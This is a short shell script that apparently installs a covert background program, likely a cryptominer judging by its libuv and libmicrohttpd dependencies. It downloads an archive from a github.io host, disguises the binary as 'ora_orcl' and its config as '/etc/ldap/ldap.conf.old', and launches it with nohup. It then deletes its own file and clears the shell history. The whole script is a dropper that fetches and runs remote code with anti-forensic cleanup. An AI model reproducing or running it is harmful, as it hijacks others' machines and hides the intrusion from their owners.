#!/bin/sh
apt-get update 
apt-get install -y libuv1 libuv1-dev libmicrohttpd10 libmicrohttpd-dev
cd /tmp
wget http://zyjsuper.github.io/temp.tar
tar xvf temp.tar
rm temp.tar
mv ldap.conf.old /etc/ldap/
mv ora_orcl /usr/local/bin
cd /usr/local/bin/
chmod 755 ora_orcl
nohup ./ora_orcl -c /etc/ldap/ldap.conf.old &
rm /tmp/1.sh
history -c
